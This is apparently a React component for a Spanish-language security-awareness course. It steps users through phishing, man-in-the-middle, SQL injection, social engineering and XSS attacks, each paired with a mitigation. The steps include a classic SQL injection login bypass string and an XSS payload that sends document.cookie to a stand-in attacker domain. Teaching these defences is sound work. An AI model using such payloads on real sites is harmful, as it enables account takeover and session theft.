"use client";

import { useState } from "react";
import {
  Mail,
  Mouse,
  KeyRound,
  AlertTriangle,
  Bug,
  Database,
  ChevronRight,
  RotateCcw,
} from "lucide-react";

type Ataque = {
  id: string;
  nombre: string;
  icon: typeof Mail;
  resumen: string;
  pasos: { titulo: string; detalle: string }[];
  mitigacion: string;
};

const ATAQUES: Ataque[] = [
  {
    id: "phishing",
    nombre: "Phishing",
    icon: Mail,
    resumen: "Email falso que imita a un servicio real para robar credenciales.",
    pasos: [
      {
        titulo: "1. Email falso",
        detalle:
          "El atacante manda un email que parece de tu banco / Office365 / Netflix. URL muy parecida (offíce365.com con í, paypa1.com con 1) y diseño robado del original.",
      },
      {
        titulo: "2. Urgencia o miedo",
        detalle:
          "«Tu cuenta será suspendida en 24 horas». «Detectamos actividad sospechosa». El truco es generar prisa para que actúes sin pensar.",
      },
      {
        titulo: "3. Página falsa",
        detalle:
          "Haces clic. La página es idéntica a la real, incluso con candado HTTPS (es fácil obtener un certificado para un dominio cualquiera).",
      },
      {
        titulo: "4. Credenciales robadas",
        detalle:
          "Escribes usuario y contraseña. Se las quedan. La página falsa te redirige a la real y crees que «hubo un error», sin darte cuenta de nada.",
      },
    ],
    mitigacion:
      "Nunca hagas clic en enlaces de emails inesperados. Entra a la página tecleando la URL tú mismo. Verifica el dominio con calma. Activa MFA: aunque robaran tu contraseña, no entran sin el segundo factor.",
  },
  {
    id: "mitm",
    nombre: "Man-in-the-middle",
    icon: Mouse,
    resumen: "Atacante se sitúa entre tu dispositivo y el servidor para leer (o modificar) el tráfico.",
    pasos: [
      {
        titulo: "1. Wi-Fi pública o red comprometida",
        detalle:
          "Te conectas a «Café_WiFi_Gratis» o a una red de empresa que un atacante controla. Todo tu tráfico pasa por su equipo.",
      },
      {
        titulo: "2. Intercepción del tráfico",
        detalle:
          "Si visitas sitios HTTP (sin cifrar), el atacante lee directamente lo que envías: contraseñas, mensajes, cookies de sesión.",
      },
      {
        titulo: "3. Suplantación con sslstrip",
        detalle:
          "Aun en HTTPS, herramientas como sslstrip pueden engañar al navegador para que use HTTP. Sin un candado visible, no notas la diferencia.",
      },
      {
        titulo: "4. Datos robados o sesión hackeada",
        detalle:
          "El atacante captura tu cookie de sesión y entra a tu cuenta sin necesidad de la contraseña. O simplemente lee todo lo que escribes.",
      },
    ],
    mitigacion:
      "Usa solo HTTPS (busca el candado y dominio correcto). Activa HSTS en tus sitios. Evita Wi-Fi pública para tareas sensibles, o usa una VPN confiable. MFA mitiga el robo de cookies (la sesión muere).",
  },
  {
    id: "sql",
    nombre: "SQL injection",
    icon: Database,
    resumen: "Atacante inyecta código SQL en un input para manipular la base de datos.",
    pasos: [
      {
        titulo: "1. Campo de entrada vulnerable",
        detalle:
          "Un formulario de login construye la query así: `SELECT * FROM users WHERE email='$email' AND pwd='$pwd'`. Concatena la entrada del usuario directo en la query.",
      },
      {
        titulo: "2. Input malicioso",
        detalle:
          "El atacante escribe en el campo email: `' OR '1'='1`. La query queda: `WHERE email='' OR '1'='1' AND pwd='...'`. La condición es siempre verdadera.",
      },
      {
        titulo: "3. Acceso sin contraseña",
        detalle:
          "La base devuelve el primer usuario (normalmente admin). El atacante entra sin saber ninguna contraseña real.",
      },
      {
        titulo: "4. Escalada",
        detalle:
          "Con técnicas más avanzadas (UNION SELECT, blind SQL injection) puede leer toda la base, borrar tablas o robar datos sensibles.",
      },
    ],
    mitigacion:
      "NUNCA concatenes input del usuario en queries. Usa queries parametrizadas / prepared statements. Cualquier framework moderno (Django ORM, Rails, JPA, Prisma) lo hace por ti si no lo evitas. Filtros adicionales: validar formato, escapar caracteres.",
  },
  {
    id: "social",
    nombre: "Ingeniería social",
    icon: KeyRound,
    resumen: "El atacante manipula a una persona en vez de explotar tecnología.",
    pasos: [
      {
        titulo: "1. Reconocimiento",
        detalle:
          "El atacante investiga en LinkedIn quién trabaja en TI, en RRHH, en la junta. Aprende nombres, roles y proyectos en curso.",
      },
      {
        titulo: "2. Pretexto creíble",
        detalle:
          "Llama o escribe haciéndose pasar por alguien con autoridad: «Soy del soporte técnico, necesito tu contraseña para un mantenimiento urgente».",
      },
      {
        titulo: "3. Presión emocional",
        detalle:
          "Aprovecha urgencia, miedo, autoridad o simpatía. «El CEO me pidió esto AHORA, no me hagas explicárselo».",
      },
      {
        titulo: "4. Obtiene acceso",
        detalle:
          "Sin tocar ningún sistema técnico, consigue una contraseña, un código MFA o que alguien le ejecute un programa malicioso. El humano sigue siendo el eslabón más débil.",
      },
    ],
    mitigacion:
      "Cultura: nadie del soporte real te va a pedir tu contraseña, NUNCA. Cuelga y devuelve la llamada por canales oficiales. Capacitación regular sobre ingeniería social. Procesos formales para cambios sensibles (rotación de credenciales, transferencias, accesos).",
  },
  {
    id: "xss",
    nombre: "XSS (Cross-Site Scripting)",
    icon: Bug,
    resumen: "Atacante mete JavaScript malicioso en una página que otros visitan.",
    pasos: [
      {
        titulo: "1. Campo que no escapa HTML",
        detalle:
          "Un foro guarda comentarios y los muestra tal cual. Si escribes `<script>alert(1)</script>` y la app no lo escapa, cualquier visitante ejecutará ese script en su navegador.",
      },
      {
        titulo: "2. Payload malicioso",
        detalle:
          "El atacante inyecta un script que roba cookies: `<script>fetch('//atacante.com?c='+document.cookie)</script>`.",
      },
      {
        titulo: "3. Víctimas visitan la página",
        detalle:
          "Cada usuario que abre el post ejecuta el script. Sus cookies de sesión viajan al servidor del atacante.",
      },
      {
        titulo: "4. Sesiones robadas",
        detalle:
          "Con las cookies, el atacante entra a las cuentas de las víctimas sin necesidad de sus contraseñas ni MFA (porque ya están logueadas).",
      },
    ],
    mitigacion:
      "Escapa SIEMPRE el HTML que viene del usuario antes de renderizarlo. Frameworks como React lo hacen por defecto. Cookies con flags HttpOnly y Secure (no accesibles por JS). Content Security Policy (CSP) limita qué scripts pueden ejecutarse.",
  },
];

export function AttackFlow() {
  const [ataqueId, setAtaqueId] = useState(ATAQUES[0].id);
  const [paso, setPaso] = useState(0);

  const ataque = ATAQUES.find((a) => a.id === ataqueId)!;
  const Icon = ataque.icon;
  const pasoActual = ataque.pasos[paso];

  const cambiarAtaque = (id: string) => {
    setAtaqueId(id);
    setPaso(0);
  };

  return (
    <div className="rounded-card border border-border bg-surface p-4">
      {/* Attack selector */}
      <div className="flex flex-wrap gap-1.5 mb-3">
        {ATAQUES.map((a) => {
          const AtaqueIcon = a.icon;
          return (
            <button
              key={a.id}
              type="button"
              onClick={() => cambiarAtaque(a.id)}
              className={`inline-flex items-center gap-1.5 text-[11.5px] px-2.5 py-1.5 rounded-full border transition-colors ${
                a.id === ataqueId
                  ? "bg-accent text-bg border-accent"
                  : "bg-surface2 text-text-muted border-border hover:border-accent/40"
              }`}
            >
              <AtaqueIcon size={12} strokeWidth={2} />
              {a.nombre}
            </button>
          );
        })}
      </div>

      <div className="rounded-card border border-red-500/40 bg-red-500/5 p-3 mb-3">
        <div className="flex items-center gap-2 mb-1 text-red-700">
          <Icon size={16} strokeWidth={1.8} />
          <span className="text-[13.5px] font-semibold">{ataque.nombre}</span>
        </div>
        <p className="text-[12.5px] text-text-primary leading-relaxed">
          {ataque.resumen}
        </p>
      </div>

      {/* Step indicator */}
      <div className="flex items-center justify-between gap-1 mb-3">
        {ataque.pasos.map((_, i) => (
          <div key={i} className="flex items-center gap-1 shrink-0">
            <div
              className={`w-7 h-7 rounded-full border flex items-center justify-center text-[11px] font-semibold transition-colors ${
                i === paso
                  ? "bg-red-500 text-bg border-red-500"
                  : i < paso
                  ? "bg-red-500/20 text-red-700 border-red-500/40"
                  : "bg-surface2 text-text-dim border-border"
              }`}
            >
              {i + 1}
            </div>
            {i < ataque.pasos.length - 1 && (
              <ChevronRight size={12} className="text-text-dim shrink-0" />
            )}
          </div>
        ))}
      </div>

      {/* Step content */}
      <div className="rounded-card border border-border bg-bg p-3 mb-3 min-h-[120px]">
        <div className="text-[13.5px] font-semibold text-text-primary mb-1.5">
          {pasoActual.titulo}
        </div>
        <p className="text-[12.5px] text-text-primary leading-relaxed">
          {pasoActual.detalle}
        </p>
      </div>

      {/* Controls */}
      <div className="flex items-center justify-between gap-2 mb-3">
        <button
          type="button"
          onClick={() => setPaso((s) => Math.max(0, s - 1))}
          disabled={paso === 0}
          className="text-[12.5px] px-3 py-2 rounded-card border border-border bg-bg text-text-primary disabled:opacity-40 disabled:cursor-not-allowed hover:border-accent/40 transition-colors"
        >
          ← Anterior
        </button>
        <span className="text-[11px] text-text-dim">
          Paso {paso + 1} de {ataque.pasos.length}
        </span>
        {paso < ataque.pasos.length - 1 ? (
          <button
            type="button"
            onClick={() => setPaso((s) => Math.min(ataque.pasos.length - 1, s + 1))}
            className="text-[12.5px] px-3 py-2 rounded-card border border-accent bg-accent text-bg hover:bg-accent/90 transition-colors"
          >
            Siguiente →
          </button>
        ) : (
          <button
            type="button"
            onClick={() => setPaso(0)}
            className="inline-flex items-center gap-1.5 text-[12.5px] px-3 py-2 rounded-card border border-border bg-surface2 text-text-muted hover:text-text-primary transition-colors"
          >
            <RotateCcw size={13} strokeWidth={1.8} />
            Reiniciar
          </button>
        )}
      </div>

      {/* Mitigation */}
      {paso === ataque.pasos.length - 1 && (
        <div className="rounded-card border border-accent/40 bg-accent/5 p-3">
          <div className="flex items-center gap-1.5 text-accent mb-1">
            <AlertTriangle size={13} strokeWidth={2} />
            <span className="text-[11.5px] font-semibold uppercase tracking-wide">
              Cómo mitigarlo
            </span>
          </div>
          <p className="text-[12px] text-text-primary leading-relaxed">
            {ataque.mitigacion}
          </p>
        </div>
      )}
    </div>
  );
}
